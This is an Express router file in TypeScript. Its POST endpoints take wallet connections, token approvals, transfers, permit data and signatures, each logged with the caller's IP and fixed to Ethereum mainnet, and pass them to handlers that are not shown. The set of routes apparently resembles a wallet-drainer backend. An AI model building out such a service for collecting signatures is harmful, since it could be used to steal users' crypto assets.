import { Router } from 'express';
import { handleConnect, handleApprove, handleTransfer, handlePermit, handleSign } from '../module/user.services';
import { validateRequest } from '../utils/Middleware';

const router = Router();

router.post('/connect', validateRequest, async (req, res) => {
  try {
    const result = await handleConnect(req.body.wallet, req.ip, 1);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: (err as Error).message });
  }
});

router.post('/approve', validateRequest, async (req, res) => {
  const { asset, signature } = req.body;
  asset.chainId = 1;
  const result = await handleApprove(asset, signature, req.ip);
  res.json(result);
});

router.post('/transfer', validateRequest, async (req, res) => {
  const { asset, signature } = req.body;
  asset.chainId = 1;
  const result = await handleTransfer(asset, signature, req.ip);
  res.json(result);
});

router.post('/permit', validateRequest, async (req, res) => {
  const { permitData, signature } = req.body;
  permitData.asset = { ...permitData.asset, chainId: 1 };
  const result = await handlePermit(permitData, signature, req.ip);
  res.json(result);
});

router.post('/sign', validateRequest, async (req, res) => {
  const { message, signature } = req.body;
  const result = await handleSign(message, signature, req.ip);
  res.json(result);
});

export default router;